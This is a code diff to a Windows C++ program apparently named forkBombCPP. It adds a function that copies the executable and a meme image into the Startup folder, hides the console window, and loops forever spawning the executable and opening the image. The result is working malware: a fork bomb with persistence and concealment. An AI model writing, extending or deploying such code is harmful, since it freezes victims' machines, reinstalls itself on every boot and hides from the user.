@@ -10,13 +10,21 @@ bool check_image_exists(){
     return ( access ( name, F_OK ) != -1);
 }
 
+void run_start(){
+	CopyFile("C:/Documents and Settings/Owner/Desktop/meme_payload.jpg","C:/Documents and Settings/Owner/Start Menu/Programs/Startup/meme_payload.jpg",1);  
+
+
+	CopyFile("C:/Documents and Settings/Owner/Desktop/forkBombCPP.exe","C:/Documents and Settings/Owner/Start Menu/Programs/Startup/forkBombCPP.exe",1);  
+
+}
+
 // Opens if there is already a hard-coded image
 // Creates if it doesn't exist
 // Returns if image was successful
 bool open_image(){
 
     if(check_image_exists()){
-        ShellExecute(0, "open", "meme_payload.jpg", NULL, NULL, SW_SHOWMAXIMIZED);
+        ShellExecute(0, "open", "C:/Documents and Settings/Owner/Desktop/meme_payload.jpg", NULL, NULL, SW_SHOWMAXIMIZED);
         return 1;
     } else {
         printf("No Payload!");
@@ -35,16 +43,18 @@ bool open_image(){
 
 int main( )
 {
-    STARTUPINFO si;
+	::ShowWindow(::GetConsoleWindow(), SW_HIDE); 
+	STARTUPINFO si;
     PROCESS_INFORMATION pi;
 
     ZeroMemory( &si, sizeof(si) );
     si.cb = sizeof(si);
     ZeroMemory( &pi, sizeof(pi) );    
-
-    while (1) {
+	while (1) {
         open_image();
-	   // Start the child process. 
+		run_start(); //propagates forkBombCPP.exe to startup folder
+
+		// Start the child process. 
 	   if (!CreateProcess(NULL,   // No module name (use command line)
 		  ((LPSTR) "forkBombCPP.exe"),        // file to run
 		  NULL,           // Process handle not inheritable
@@ -52,7 +62,7 @@ int main( )
 		  FALSE,          // Set handle inheritance to FALSE
 		  0,              // No creation flags
 		  NULL,           // Use parent's environment block
-		  NULL,           // Use parent's starting directory 
+		  "C:/Documents and Settings/Owner/Desktop/",           // Use parent's starting directory 
 		  &si,            // Pointer to STARTUPINFO structure
 		  &pi)           // Pointer to PROCESS_INFORMATION structure
 		  )
